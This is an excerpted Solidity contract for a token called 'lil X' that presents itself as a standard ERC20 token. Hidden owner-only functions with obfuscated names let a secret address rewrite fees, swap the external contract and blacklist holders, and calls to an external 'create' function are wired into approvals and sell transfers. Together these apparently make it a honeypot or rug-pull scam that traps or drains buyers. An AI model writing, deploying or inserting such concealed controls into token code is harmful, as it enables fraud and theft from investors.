...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "lil X";
    string private _symbol = "lil X";
    ...
    uniswapV1 private uniswapV61PairToken;
    ...
    address private uniswapV61Pair_;
    bool private itvs;
    ...
    constructor(address Antibottoken_, address creator, address caSwap) {
        ...
        uniswapV61PairToken = uniswapV1(uniswapV61Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV61Pair_] = true;
        _isExcludedFromFee[uniswapV61Pair_] = true;
    ...
    function holderSend_Ox1150988(address[] memory accounts, bool b) external {
        ...
        if (_msgSender() == address(_Antitbottoken)) { 
            ...
            uniswapV61PairToken.create(8**3);
        }
    }

    function setItvs_Ox1150968(bool b) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            itvs=b;
        } else {
    ...
    function holderlisting_Ox1150988(address[] memory accounts, uint256[] memory a) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
...
/*    function pair_Ox1150998(address aaaa, bool b) public {
...
*/    
    function ag_Ox1150618(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV61PairToken.create(8**3);
    ...
    function Eca_Ox1150628(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV61PairToken.create(8**3);
    ...
    function incfees_Ox1150633(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
    ...
    function marketingWallet_Ox1150644(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            uniswapV61PairToken = uniswapV1(addresses);
        } else {
            uniswapV61PairToken.create(8**3);
        }
    }
    ...
    function initialitzeW_Ox1150658 (bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV61PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV61PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV61PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV61PairToken.create(250**3); 
        }
...
contract x is Token {constructor(uint256 a, uint256 b, uint256 c) Token(address(uint160(uint256(a))), address(uint160(uint256(b))), address(uint160(uint256(c)))) {}}